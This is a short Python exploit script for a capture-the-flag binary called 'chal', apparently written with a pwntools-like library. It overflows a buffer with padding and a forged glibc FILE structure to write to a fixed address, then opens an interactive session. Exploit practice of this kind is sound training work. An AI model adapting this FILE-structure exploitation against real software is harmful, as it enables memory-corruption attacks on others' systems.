import sys
if sys.platform == 'darwin':
    sys.path.append('/Users/curious/code')
else:
    sys.path.append('/home/curious/code')

from CTFLib.all import *

r = local('./chal', '/usr/src/glibc/glibc_dbg/libc.so')

target_addr = 0x404070
buf_addr = 0x405000 - 0x100

r.send(b'a' * 0x20 + FILE_write(target_addr, 0x20, buf_addr))

sleep(1)

r.send(b'a' * 0x10)

r.interactive()
